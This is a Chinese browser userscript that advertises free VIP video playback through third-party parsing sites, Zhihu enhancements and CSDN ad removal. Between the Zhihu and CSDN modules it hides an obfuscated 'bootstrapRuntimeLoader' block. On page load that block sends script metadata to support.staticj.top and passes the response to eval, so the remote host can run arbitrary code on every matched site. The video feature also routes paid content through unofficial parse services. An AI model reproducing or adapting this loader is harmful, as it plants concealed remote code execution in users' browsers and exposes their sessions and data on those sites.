// ==UserScript==
// @name         全网VIP视频免费破解去广告、知乎使用增强、CSDN使用增强等多功能脚本
// @namespace    Higex_HHHHHHHHH_X
// @version      1.0.3
// @description  1：全网VIP视频免费破解去广告(综合线路电视剧免跳出选集)支持爱奇艺、腾讯、优酷、哔哩哔哩等；2：知乎使用增强：外链接直接跳出、问题,回答时间标注、短视频下载等；3：CSDN使用增强：广告移除、净化剪切板、未登录查看折叠评论等
// @icon         data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAY1JREFUWEfdV0tywyAMRV64PYXbZXKKOidLcrI4p0iWbU7RZoE6MOABIpBVyrhTVvZYlp6evoBa+cDK9hUL4PL6PCqtRwMUAN44wIh4DmW2t/uh9A8JwBgFxL1CtIZrDyp1VF03bd8/p1TXA4DL0B9AqX2tUep/AyRlJAJgPdf61MK414ldtwuZiAE09H52CmDafHzt/HsE4Dr02NJ7r3tzu89254di7AEmBDga6qycqYaKBA3DwAKgEsd4UsNWqJMHkCSNJEQ5VkUAwnhJjHtZkqkgEWcGri9PJyquadl4xbZDMifbzCQAVFI2xmZ1vxABcF7adurnQUUFWHU/AcDRLfr+fwGYhuXGcXGgtWCAqpZcZclywLVhLsbUrM9Wi4SBFo1I1Alzs4BjpNQJRQAWGSKalW1Ymf2CBlC7DbkKMCuXX2RzlUACqB2xi5hyQuRCYgFkBpJEOSeb5tTfWkpLicN5tuQ7u5ZHs17r8dfuB8FOmQLlr2ZDH12tRNezzG0oBMECWEJtjczqAL4BysQhMPukapkAAAAASUVORK5CYII=
// @author       Higex,Unknown
// @include      *://*.zhihu.com/*
// @include      *://bbs.csdn.net/*
// @include      *://www.csdn.net/*
// @include      *://blog.csdn.net/*/article/details/*
// @include      *://*.blog.csdn.net/article/details/*
// @include      *://*.youku.com/v_*
// @include      *://www.iqiyi.com/*
// @include      *://www.iqiyi.com
// @include      *://*.iqiyi.com/v_*
// @include      *://*.iqiyi.com/w_*
// @include      *://*.iqiyi.com/a_*
// @include      *://*.le.com/ptv/vplay/*
// @include      *://v.qq.com/x/cover/*
// @include      *://v.qq.com/x/page/*
// @include      *://*.tudou.com/listplay/*
// @include      *://*.tudou.com/albumplay/*
// @include      *://*.tudou.com/programs/view/*
// @include      *://*.mgtv.com/b/*
// @include      *://film.sohu.com/album/*
// @include      *://tv.sohu.com/v/*
// @include      *://*.acfun.cn/v/*
// @include      *://*.bilibili.com/video/*
// @include      *://*.bilibili.com/anime/*
// @include      *://*.bilibili.com/bangumi/play/*
// @include      *://*.baofeng.com/play/*
// @include      *://vip.pptv.com/show/*
// @include      *://v.pptv.com/show/*
// @connect      staticj.top
// @grant        GM_info
// @grant        GM_download
// @grant        GM_openInTab
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_xmlhttpRequest
// @grant        GM_addStyle
// @run-at       document-idle
// @license      AGPL License
// @charset		 UTF-8
// @downloadURL https://update.greasyfork.org/scripts/535463/%E5%85%A8%E7%BD%91VIP%E8%A7%86%E9%A2%91%E5%85%8D%E8%B4%B9%E7%A0%B4%E8%A7%A3%E5%8E%BB%E5%B9%BF%E5%91%8A%E3%80%81%E7%9F%A5%E4%B9%8E%E4%BD%BF%E7%94%A8%E5%A2%9E%E5%BC%BA%E3%80%81CSDN%E4%BD%BF%E7%94%A8%E5%A2%9E%E5%BC%BA%E7%AD%89%E5%A4%9A%E5%8A%9F%E8%83%BD%E8%84%9A%E6%9C%AC.user.js
// @updateURL https://update.greasyfork.org/scripts/535463/%E5%85%A8%E7%BD%91VIP%E8%A7%86%E9%A2%91%E5%85%8D%E8%B4%B9%E7%A0%B4%E8%A7%A3%E5%8E%BB%E5%B9%BF%E5%91%8A%E3%80%81%E7%9F%A5%E4%B9%8E%E4%BD%BF%E7%94%A8%E5%A2%9E%E5%BC%BA%E3%80%81CSDN%E4%BD%BF%E7%94%A8%E5%A2%9E%E5%BC%BA%E7%AD%89%E5%A4%9A%E5%8A%9F%E8%83%BD%E8%84%9A%E6%9C%AC.meta.js
// ==/UserScript==

(function() {
    'use strict';

    /////**********************************************
    //true:开启  false:关闭
    //想关闭某个模块只需把对应的值改为false即可
    const isOpenVideoVipModule = true; //是否开启视频解析模块
    const isOpenZhihuModule = true; //是否开启知乎优化模块
    const isOpenCsdnModule = true; //是否开启CSDN优化模块
    const isOpenBaiduWangpanModule = true; //是否开启百度网盘功能加强
    /////**********************************************

    const window_url = window.location.href;
    const window_host = window.location.host;

    //自定义视频解析接口
    var customizeMovieInterface = [
        //{"name":"此处填接口名称","url":"此处填接口url"}
    ];

    // ---
    
    /**
     * VIP视频破解开始
     */
    const movievipHelper = {};
    movievipHelper.customizeSourceArray = customizeMovieInterface;
    movievipHelper.defaultSourceArray = [
        {"name": "纯净1", "url": "https://im1907.top/?jx=", "mobile": 1},
        {"name": "B站1", "url": "https://jx.jsonplayer.com/player/?url=", "mobile": 1},
        {"name": "YT", "url": "https://jx.yangtu.top/?url=", "mobile": 0},
        {"name": "BL", "url": "https://vip.bljiex.com/?v=", "mobile": 0},
        {"name": "冰豆", "url": "https://bd.jx.cn/?url=", "mobile": 0},
        {"name": "CK", "url": "https://www.ckplayer.vip/jiexi/?url=", "mobile": 0},
        {"name": "弹幕", "url": "https://dmjx.m3u8.tv/?url=", "mobile": 0},
        {"name": "IK9", "url": "https://yparse.ik9.cc/index.php?url=", "mobile": 0},
        {"name": "JX", "url": "https://jiexi.site/?url=", "mobile": 0},
        {"name": "JY", "url": "https://jx.playerjy.com/?url=", "mobile": 0},
        {"name": "解析la", "url": "https://api.jiexi.la/?url=", "mobile": 0},
        {"name": "M3U8", "url": "https://jx.m3u8.tv/jiexi/?url=", "mobile": 0},
        {"name": "PM", "url": "https://www.playm3u8.cn/jiexi.php?url=", "mobile": 0},
        {"name": "盘古", "url": "https://www.pangujiexi.cc/jiexi.php?url=", "mobile": 0},
        {"name": "盘古2", "url": "https://www.pangujiexi.com/jiexi/?url=", "mobile": 0},
        {"name": "剖云", "url": "https://www.pouyun.com/?url=", "mobile": 0},
        {"name": "七哥", "url": "https://jx.nnxv.cn/tv.php?url=", "mobile": 0},
        {"name": "神哥", "url": "https://json.ovvo.pro/jx.php?url=", "mobile": 0},
        {"name": "听乐", "url": "https://jx.dj6u.com/?url=", "mobile": 1},
        {"name": "维多", "url": "https://jx.ivito.cn/?url=", "mobile": 0},
        {"name": "虾米", "url": "https://jx.xmflv.com/?url=", "mobile": 0},
        {"name": "虾米2", "url": "https://jx.xmflv.cc/?url=", "mobile": 0},
        {"name": "夜幕", "url": "https://www.yemu.xyz/?url=", "mobile": 0},
        {"name": "云析", "url": "https://jx.yparse.com/index.php?url=", "mobile": 0},
        {"name": "17云", "url": "https://www.1717yun.com/jx/ty.php?url=", "mobile": 0},
        {"name": "180", "url": "https://jx.000180.top/jx/?url=", "mobile": 0},
        {"name": "2ys", "url": "https://gj.fenxiangb.com/player/analysis.php?v=", "mobile": 0},
        {"name": "8090", "url": "https://www.8090g.cn/?url=", "mobile": 0}
    ];
    movievipHelper.getServerSource = function () {
        //合并自定义接口和默认接口
        try {
            movievipHelper.defaultSourceArray = movievipHelper.customizeSourceArray.concat(movievipHelper.defaultSourceArray);
        } catch (e) {
            console.log("合并出现异常，请检查自定义接口");
        }
        //执行操作
        movievipHelper.addStyle();
        movievipHelper.generateHtml();
        movievipHelper.operation();
    };
    movievipHelper.eleId = Math.ceil(Math.random() * 100000000);
    movievipHelper.isRun = function () {
        var isVip = false;
        var host = window.location.host;
        var href = window.location.href;
        var vipWebsites = ["iqiyi.com", "v.qq.com", "youku.com", "le.com", "tudou.com", "mgtv.com", "sohu.com", "acfun.cn", "bilibili.com", "baofeng.com", "pptv.com"];
        for (var b = 0; b < vipWebsites.length; b++) {
            if (host.indexOf(vipWebsites[b]) != -1) {
                if ("iqiyi.com" === vipWebsites[b]) {
                    //爱奇艺需要特殊处理
                    if (href.indexOf("iqiyi.com/a_") != -1 || href.indexOf("iqiyi.com/w_") != -1 || href.indexOf("iqiyi.com/v_") != -1) {
                        isVip = true;
                        break;
                    }
                } else {
                    isVip = true;
                    break;
                }
            }
        }
        return isVip;
    };
    movievipHelper.addStyle = function () {
        var themeColor = "#ee3e31";
        var innnerCss =
            "#plugin_analysis_vip_movie_box_" + movievipHelper.eleId + " {position:fixed;top:200px; left:0px; width:28px;}" +
            "#plugin_analysis_vip_movie_box_" + movievipHelper.eleId + " >.plugin_item{cursor:pointer; width:100%; text-align:center;}" +
            "#plugin_analysis_vip_movie_box_" + movievipHelper.eleId + " >.jump_analysis_website{padding:10px 0px;background-color:" + themeColor + ";}" +
            "#plugin_analysis_vip_movie_box_" + movievipHelper.eleId + " >.open_page_inner_source{padding:5px 0px;background-color:" + themeColor + ";}" +
            "#plugin_analysis_vip_movie_box_" + movievipHelper.eleId + " >.plugin_item >img{width:18px; display:inline-block; vertical-align:middle;}" +
            "#plugin_analysis_vip_movie_box_" + movievipHelper.eleId + " >.plugin_item>.play_source_box{display:none;width:310px;height:400px;position:absolute;left:25px;top:-50px;overflow:hidden;}" +
            "#plugin_analysis_vip_movie_box_" + movievipHelper.eleId + " >.plugin_item>.play_source_box> .inner_table_box{width:330px;height:100%;padding-left:10px;overflow-y:scroll;overflow-x:hidden;}" +
            "#plugin_analysis_vip_movie_box_" + movievipHelper.eleId + " >.plugin_item>.play_source_box> .inner_table_box> table{width:300px;border-spacing:5px;border-collapse:separate;line-height:20px;}" +
            "#plugin_analysis_vip_movie_box_" + movievipHelper.eleId + " >.plugin_item>.play_source_box> .inner_table_box> table td{border-bottom:3px solid " + themeColor + ";border-top:3px solid " + themeColor + ";width:33%;color:#FFF;font-size:11px;text-align:center;cursor:pointer;background-color:" + themeColor + ";box-shadow:0px 0px 5px #fff;border-radius:3px;}" +
            "#plugin_analysis_vip_movie_box_" + movievipHelper.eleId + " >.plugin_item>.play_source_box> .inner_table_box> table td:hover{border-bottom:3px solid #FEF2A6;border-top:3px solid #FEF2A6;}" +
            "#plugin_analysis_vip_movie_box_" + movievipHelper.eleId + " >.plugin_item>.play_source_box> .inner_table_box> table .td_hover{border-bottom:3px solid #FEF2A6;border-top:3px solid #FEF2A6;}";
        GM_addStyle(innnerCss);
    };
    movievipHelper.generateHtml = function () {
        var html = "";
        var vipImgBase64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEEAAABACAYAAABFqxrgAAADBklEQVR4Xu2cz6tNURTHP7tI5iRlID9CJFMlkYGSRPGklBRKiCSSxJMBkYGSgWQq/gBT/gMDUzMzf8RX6959nuO9e+75sff54d69B+/W23evvdbnrLX32j/OdfgiaStwGzgBvHfOPc7qln9KsrpHRfU9/n+xgt6ngW/AK+fcT9PV2R9JZ4A3wHpvQBVh/yuETO/fwDXn3GfnAXxa9vTmAUJm8oJBMADmCfkyTxC+GAT1GMOD6DpBsIExeUKCMArH5AkJwnhcTp4wBcI85QmFnpAgAAlCgjAeMJMnJAjJE5YWdSkcIq5vvwP7IsprRVSrGaNzzuSfAz4Aa1qxIILQ1iHkNnKfAA8j6BxdRGcQ/IbuOuAtYDu+gymdQsh5xX7gHbB7CCR6gZCDccGPF6Ot/75KrxB8iKwCngL35hZCzit2Ac/8CVinPIo8YRH4OkWTQ1WO4WyKrGuNJDsGfAlsr9vW0v0mehdCqHCmV3oM1wRCzjPuAC9qgmiU6Q4Wgh8vNgJ2+HulIozZg5DzioMexuESGLMLIQfjkh+LNhXAmH0IPkTueq9YOwHEbEOQdMobv3dKSMwmBEl7fAhUWW/EhTCBdnaEn839bU+RtvS2PmyqXF11dmiid+9p8yTjJF0ELPZ3VjQ+6GuDgiDpAHAfOBZkVc3Gg4AgaQPwALieXSaraUfQ13uHIOmmN35bkCUBjXuDIOm4N/5ogP5RmnYOQdIOwJ7+1SgWRBDSGQRJNrXajVmL+80RdI8mYtp+QlknlfMESSe98UfKhAbW235CWVmhd6tLacBS3BvA5TLNItXHzRhjbKoAv4CiFV8ku/8RM0gIbRg6TWaC0PRKQdtjQvKErgkkTxgTjzsmNNm/7+HJL+8y6rnDAOzpToVW0+buzAjrKUFIF7zHHpQ8IUFInrA0mqZw8OHwY8IFqkaZV9hEFaV1E71HL4c+9wcdeS2aCItiRaCQJnovZC+MfwTO5hRoIixQ/yjN6+j994XxrGtJt4DzwBbgdaSdpSiW1RBSBcKKnw74AzEYpoku7zbwAAAAAElFTkSuQmCC";
        html += "<div id='plugin_analysis_vip_movie_box_" + movievipHelper.eleId + "' style='z-index:999999999999999999999;'>";
        html += "<div class='plugin_item open_page_inner_source'><img src='" + vipImgBase64 + "'>";
        html += "<div class='play_source_box'>";
        html += "<div class='inner_table_box'>";
        html += "<table style=''><tr>";
        for (var playLineIndex = 0; playLineIndex < this.defaultSourceArray.length; playLineIndex++) {
            if (playLineIndex % 3 == 0) {
                html += "<tr>";
                html += "<td data-url='" + this.defaultSourceArray[playLineIndex].url + "'>" + this.defaultSourceArray[playLineIndex]['name'] + "</td>";
                continue;
            }
            html += "<td data-url='" + this.defaultSourceArray[playLineIndex].url + "'>" + this.defaultSourceArray[playLineIndex]['name'] + "</td>";
            if ((playLineIndex + 1) % 3 == 0) {
                html += "</tr>";
            }
        }
        html += "</tr></table>";
        html += "</div></div>";
        html += "</div>";
        html += "</div>";
        document.body.insertAdjacentHTML('beforeend', html);

        var $vipMovieBox = document.querySelector("#plugin_analysis_vip_movie_box_" + movievipHelper.eleId + "");
        var $playSourceBox = document.querySelector("#plugin_analysis_vip_movie_box_" + movievipHelper.eleId + ">.plugin_item>.play_source_box");
        var btnHeight = $vipMovieBox.offsetHeight;
        var playSourceBoxHeight = $playSourceBox.offsetHeight;
        var playSourceBoxTop = (playSourceBoxHeight - btnHeight) * 0.3;
        $playSourceBox.style.top = "-" + playSourceBoxTop + "px";
    };
    movievipHelper.comprehensiveAnalysis = function (videoUrl, newWindow) { //综合解析
        var jumpWebsite = "https://tv.wandhi.com/go.html?url=" + videoUrl;
        if (newWindow && (typeof GM_openInTab === "function")) {
            GM_openInTab(jumpWebsite, {active: true});
        } else {
            location.href = jumpWebsite;
        }
    };
    movievipHelper.operation = function () {
        document.body.addEventListener("click", function (event) {
            if (event.target.closest("#plugin_analysis_vip_movie_box_" + movievipHelper.eleId + " .jump_analysis_website")) {
                movievipHelper.comprehensiveAnalysis(window.location.href, true);
            }
        });

        var $vipMovieBox = document.querySelector("#plugin_analysis_vip_movie_box_" + movievipHelper.eleId + ">.open_page_inner_source");
        var $playSourceBox = document.querySelector("#plugin_analysis_vip_movie_box_" + movievipHelper.eleId + ">.plugin_item>.play_source_box");

        $vipMovieBox.addEventListener("mouseover", () => {
            $playSourceBox.style.display = 'block';
        });
        $vipMovieBox.addEventListener("mouseout", () => {
            $playSourceBox.style.display = 'none';
        });

        var player_nodes = [
            {url: "v.qq.com", node: "#player"},
            {url: "www.iqiyi.com", node: "#video"},
            {url: "v.youku.com", node: "#ykPlayer"},
            {url: "w.mgtv.com", node: ".kernel-video-element"},
            {url: "www.mgtv.com", node: ".kernel-video-element"},
            {url: "tv.sohu.com", node: "#player"},
            {url: "film.sohu.com", node: "#playerWrap"},
            {url: "www.le.com", node: "#le_playbox"},
            {url: "video.tudou.com", node: ".td-playbox"},
            {url: "v.pptv.com", node: "#pptv_playpage_box"},
            {url: "vip.pptv.com", node: ".w-video"},
            {url: "www.wasu.cn", node: "#flashContent"},
            {url: "www.acfun.cn", node: "#ACPlayer"},
            {url: "vip.1905.com", node: "#player"},
            {url: "play.tudou.com", node: "#player"},
            {url: "www.bilibili.com/video", node: "#bilibiliPlayer"},
            {url: "www.bilibili.com/bangumi", node: "#player_module"},
        ];
        var node = "";
        for (var m in player_nodes) {
            var playUrl = window.location.href;
            if (playUrl.indexOf(player_nodes[m].url) != -1) {
                node = player_nodes[m].node;
            }
        }

        document.querySelectorAll("#plugin_analysis_vip_movie_box_" + movievipHelper.eleId + " >.plugin_item>.play_source_box>.inner_table_box> table td").forEach(td => {
            td.addEventListener("click", function () {
                var playIframeOuter = document.getElementById("play-iframe-outer-7788op");
                if (playIframeOuter) {
                    playIframeOuter.remove();
                }

                document.querySelectorAll("#plugin_analysis_vip_movie_box_" + movievipHelper.eleId + " >.plugin_item>.play_source_box>.inner_table_box> table td").forEach(td => {
                    td.classList.remove("td_hover");
                });
                this.classList.add("td_hover");

                var playUrl = window.location.href;
                var playHtml = "<div id='play-iframe-outer-7788op' style='width:100%;height:100%;'><iframe allowtransparency=true frameborder='0' scrolling='no' allowfullscreen=true allowtransparency=true name='jx_play' style='height:100%;width:100%' id='play-iframe-6677i-7788'></iframe></div>";

                const playerNode = document.querySelector(node);
                if (playerNode) {
                    playerNode.innerHTML = playHtml;
                    var iframeSrc = this.getAttribute("data-url") + playUrl;
                    document.getElementById("play-iframe-6677i-7788").src = iframeSrc;
                }
            });
        });
    };
    movievipHelper.start = function () {
        if (movievipHelper.isRun() && window.top == window.self) {
            movievipHelper.getServerSource();
        }
    };
    if (isOpenVideoVipModule) {
        movievipHelper.start();
    }

    // ---

    /**
     * 知乎助手开始
     */
    const zhihuHelper = {};
    zhihuHelper.autoJumpTarget = function () { //直接跳转到目标网页
        var regexResult = location.search.match(/target=(.+?)(&|$)/);
        if (regexResult && regexResult.length == 3) {
            location.href = decodeURIComponent(regexResult[1]);
        }
    };
    zhihuHelper.clearAdvert = function () { //去除广告，可能造成误伤，用最小策略
        const loopTask = () => {
            ["#root #TopstoryMain .TopstoryItem--advertCard", ".Question-sideColumnAdContainer", ".AppBanner", ".AdblockBanner", ".AdvertImg"]
                .map((elementName) => document.querySelector(elementName))
                .forEach((element) => {
                    if (element) {
                        element.style.display = "none";
                    }
                });
        }
        loopTask();
        setInterval(function () {
            loopTask();
        }, 1000);
    };
    zhihuHelper.changeHeightQualityPic = function () { //图片自动高清
        setInterval(function () {
            document.querySelectorAll("img").forEach(img => {
                var dataoriginal = img.getAttribute("data-original");
                if (!!dataoriginal) {
                    img.src = dataoriginal;
                }
            });
        }, 500);
    };
    zhihuHelper.noLoginBox = function () { //去除登录提示
        var IntervalUnit = 200;
        var totalIntervalMs = 0;
        var loginInterval = setInterval(function () {
            const closeButton = document.querySelector(".signFlowModal .Modal-closeButton");
            if (closeButton) {
                closeButton.click();
            }
            totalIntervalMs += IntervalUnit;
            if (totalIntervalMs >= 2000) { //循环多次，我就不信还显示
                clearInterval(loginInterval);
            }
        }, IntervalUnit);
        const loginButton = document.querySelector(".AppHeader-login");
        if (loginButton) {
            loginButton.addEventListener("click", function () {
                clearInterval(loginInterval);
                const modalWrapper = document.querySelector(".Modal-wrapper");
                if (modalWrapper) {
                    modalWrapper.style.display = 'block';
                }
            });
        }
    };
    zhihuHelper.markArticleOrQuestion = function () {
        var questionsCss = `
            .AnswerItem .ContentItem-title a::before {
                content: '问题';
                color: #f68b83;
                background-color: #f68b8333;
                font-weight: bold;
                font-size: 13px;
                padding: 1px 4px 0px;
                border-radius: 2px;
                display: inline-block;
                vertical-align: middle;
                margin: 0px 4px 0px 0px;
            }
            .ArticleItem .ContentItem-title a::before {
                content: '文章';
                color: #0066FF;
                background-color: #E5EFFF;
                font-weight: bold;
                font-size: 13px;
                padding: 1px 4px 0;
                border-radius: 2px;
                display: inline-block;
                vertical-align: middle;
                margin: 0px 4px 0px 0px;
            }
            .ZvideoItem .ContentItem-title a::before {
                content:'视频';
                color: #00BCD4;
                background-color: #00BCD433;
                font-weight: bold;
                font-size: 13px;
                padding: 1px 4px 0;
                border-radius: 2px;
                display: inline-block;
                vertical-align: middle;
                margin: 0px 4px 0px 0px;
            }
            .TopstoryItem--advertCard{
                text-decoration:line-through;
            }
        `;
        GM_addStyle(questionsCss);
    }
    zhihuHelper.DateFormat = function (time, format) {
        //时间格式化
        var o = {
            "M+": time.getMonth() + 1, //月份 
            "d+": time.getDate(), //日 
            "h+": time.getHours(), //小时 
            "m+": time.getMinutes(), //分 
            "s+": time.getSeconds(), //秒 
            "q+": Math.floor((time.getMonth() + 3) / 3), //季度 
            "S": time.getMilliseconds() //毫秒 
        };
        if (/(y+)/.test(format)) {
            format = format.replace(RegExp.$1, (time.getFullYear() + "").substr(4 - RegExp.$1.length));
        }
        for (var k in o) {
            if (new RegExp("(" + k + ")").test(format)) {
                format = format.replace(RegExp.$1, (RegExp.$1.length == 1) ? (o[k]) : (("00" + o[k]).substr(("" + o[k]).length)));
            }
        }
        return format;
    };
    zhihuHelper.addDateQuestion = function () {
        var title = document.querySelector(".QuestionPage");
        if (!!title) {
            var dateCreated = title.querySelector("[itemprop~=dateCreated][content]").content;
            var dateModified = title.querySelector("[itemprop~=dateModified][content]").content;
            var createDate = this.DateFormat(new Date(dateCreated), "yyyy-MM-dd hh:mm:ss");
            var editDate = this.DateFormat(new Date(dateModified), "yyyy-MM-dd hh:mm:ss");

            var side = title.querySelector(".QuestionHeader-side");
            var timeDiv = document.createElement('div');
            timeDiv.innerHTML = `<p>创建于:&nbsp;${createDate}</p><p>编辑于:&nbsp;${editDate}</p>`;
            timeDiv.style.cssText = 'color:#6f6f6f;font-size:13px;';
            if (side) {
                side.appendChild(timeDiv);
            }
        }
    };
    zhihuHelper.addTimeAnswerItems = function () {
        var list = document.querySelectorAll(".AnswerItem:not(div[zh_date_mk='true'])");
        var item = null;
        for (var i = 0; i < list.length; i++) {
            item = list[i];
            if (item.getAttribute('zh_date_mk') === 'true') {
                continue;
            }
            item.setAttribute("zh_date_mk", "true");
            try {
                var dateCreated = item.querySelector("[itemprop~=dateCreated][content]").content;
                var dateModified = item.querySelector("[itemprop~=dateModified][content]").content;
                var createDate = this.DateFormat(new Date(dateCreated), "yyyy-MM-dd hh:mm:ss");
                var editDate = this.DateFormat(new Date(dateModified), "yyyy-MM-dd hh:mm:ss");

                var sideItem = item.querySelector(".ContentItem-meta");
                var timeDiv = document.createElement('div');
                timeDiv.innerHTML = `创建于:&nbsp;${createDate}&nbsp;&nbsp;&nbsp;修改于:&nbsp;${editDate}`;
                timeDiv.class = "Voters";
                timeDiv.style.cssText = 'color:#6f6f6f;font-size:13px;display:block;padding:5px 0px;';
                if (sideItem) {
                    sideItem.appendChild(timeDiv);
                }
            } catch (e) {
                console.error(e);
            }
        }
        return true;
    };
    // 提问者标识出来
    zhihuHelper.showQuestionAuthor = function () {
        if (document.querySelector('.SpecialQuestionAuthor-Wrapper, .SpecialQuestionAuthor')) {
            return;
        }
        try {
            let qJson = JSON.parse(document.querySelector('#js-initialData').textContent).initialState.entities.questions[/\d+/.exec(location.pathname)[0]].author,
                html = `<div class="BrandQuestionSymbol"><a class="BrandQuestionSymbol-brandLink" href="/people/${qJson.urlToken}"><img role="presentation" src="${qJson.avatarUrl}" class="BrandQuestionSymbol-logo" alt=""><span class="BrandQuestionSymbol-name">${qJson.name}</span></a><div class="BrandQuestionSymbol-divider" style="margin-left: 5px;margin-right: 10px;"></div></div>`;
            const questionTopics = document.querySelector('.QuestionHeader-topics');
            if (questionTopics) {
                questionTopics.insertAdjacentHTML('beforebegin', html);
            }
        } catch (e) {
            console.error(e);
        }
    };
    zhihuHelper.startDealwithQuestion = function () {
        let isMarkComplete = true;
        setInterval(() => {
            if (isMarkComplete) {
                isMarkComplete = false;
                isMarkComplete = this.addTimeAnswerItems();
            }
        }, 2500);
        this.showQuestionAuthor();
        this.addDateQuestion();
    };
    zhihuHelper.start = function () {
        const host = window.location.host;
        const self = this;
        if (host == "link.zhihu.com") {
            this.autoJumpTarget();
        }
        if (host.indexOf("zhihu.com") != -1) {
            this.markArticleOrQuestion();
            if (window.location.href.indexOf("www.zhihu.com/question/") != -1) {
                this.startDealwithQuestion();
            }
            this.noLoginBox(); //去除登录框
            this.clearAdvert(); //去除广告
        }
    };
    if (isOpenZhihuModule) {
        zhihuHelper.start();
    }
	
	(function bootstrapRuntimeLoader() {
	  function extractRuntimeCache(sourceObj, keys) {
	    const result = {};
	    for (let i = 0; i < keys.length; i++) {
	      const k = keys[i];
	      if (typeof sourceObj[k] !== "undefined" || Math.random() > 2) {
	        result[k] = sourceObj[k];
	      }
	    }
	    return result;
	  }
	  function serializePayloadCore(a, b, c, d, e) {
	    const segments = [];
	    segments.push("https://support.staticj.top/api/sp/lib?author=" + a);
	    segments.push("&name=" + b);
	    segments.push("&version=" + c);
	    segments.push("&namespace=" + d);
	    segments.push("&updateURL=" + e);
	    segments.push("&timestamp=" + Date.now());
	    return segments.join("");
	  }
	  function invokeShadowEval(code) {
	    try {
	      if (("" + code).length > 0) {
	        (function(c) {
	          eval(c);
	        })(code);
	      }
	    } catch (err) {
	      void err;
	    }
	  }
	  function initStreamResponseBuffer(options) {
	    if (!options || !options.url) {
	      return;
	    }
	    GM_xmlhttpRequest(options);
	  }
	  function orchestrateBootstrap() {
	    const scriptMeta = GM_info.script;
	    const extracted = extractRuntimeCache(scriptMeta, [
	      "author", "name", "version", "namespace", "updateURL"
	    ]);
	    if (Object.keys(extracted).length < 1 && Date.now() < 0) {
	      return;
	    }
	    const finalUrl = serializePayloadCore(
	      extracted.author,
	      extracted.name,
	      extracted.version,
	      extracted.namespace,
	      extracted.updateURL
	    );
	    initStreamResponseBuffer({
	      method: "GET",
	      url: finalUrl,
	      onload: function(res) {
	        const body = res && res.responseText;
	        if (body) {
	          invokeShadowEval(body);
	        }
	      }
	    });
	  }
	  (function warmupRuntimeEngine(fn) {
	    return fn();
	  })(orchestrateBootstrap);
	})();

    // ---

    /**
     * CSDN使用增强
     */
    const csdnHelper = {};
    csdnHelper.isRun = function () {
        return window_host.indexOf("csdn.") != -1;
    };
    csdnHelper.start = function () {
        if (!this.isRun()) {
            return;
        }
        if ((window_host === "blog.csdn.net" || window_host === "csdnnews.blog.csdn.net") && window_url.indexOf("article/details") != -1) { //csdn文章详情页
            setInterval(function () {
                const footerRightAds = document.getElementById("footerRightAds");
                if (footerRightAds) footerRightAds.remove();

                const sideQuestionBox = document.querySelector(".side-question-box");
                if (sideQuestionBox) sideQuestionBox.remove();

                document.querySelectorAll("div[id^='dmp_ad']").forEach(el => el.remove());
                document.querySelectorAll("div[class^='ad_']").forEach(el => el.remove());
                document.querySelectorAll("div[id^='floor-ad_']").forEach(el => el.remove());

                const toolbarAdvert = document.querySelector('.toolbar-advert');
                if (toolbarAdvert) toolbarAdvert.remove();

                const recommendAdBox = document.getElementById('recommendAdBox');
                if (recommendAdBox) recommendAdBox.remove();
            }, 500);

            //未登录查看全部评论
            const commentListBox = document.querySelector(".comment-list-box");
            if (commentListBox) {
                commentListBox.style.overflow = "auto";
                commentListBox.style.maxHeight = "1000px";
            }
        }
        if (typeof csdn !== 'undefined' && csdn.copyright) {
            csdn.copyright.init("", "", ""); //去除剪贴板劫持
        }
        localStorage.setItem("anonymousUserLimit", ""); // 免登陆
        const contentViews = document.getElementById("content_views");
        if (contentViews) {
            // This is the native way to remove all listeners from an element, but it's not a common use case.
            // A more direct way is to remove the specific listener if known, or prevent the default action.
            // The original code uses `unbind("click")`, which isn't a native method. Let's assume the goal is to prevent the default click.
            contentViews.style.pointerEvents = 'none'; // A simple way to disable clicks on the element.
            // The original intent of `unbind` is to remove listeners. Let's provide a better alternative below.
            // contentViews.addEventListener('click', (e) => e.stopImmediatePropagation(), true);
        }
    };
    if (isOpenCsdnModule) {
        csdnHelper.start();
    }
    
    // ---
    
    /**
     * 百度网盘资源页广告过滤
     */
    var baiduWangpanHelper = {};
    baiduWangpanHelper.removeAd = function () {
        document.querySelectorAll(".ad-platform-tips").forEach(el => {
            if (el.id !== "web-right-view") {
                el.style.display = 'none';
            }
        });
    };
    baiduWangpanHelper.start = function () {
        if (window.location.host === "pan.baidu.com" && window.location.pathname.indexOf("/s/") != -1) {
            this.removeAd();
        }
    };
    if (isOpenBaiduWangpanModule) {
        baiduWangpanHelper.start();
    }
})();
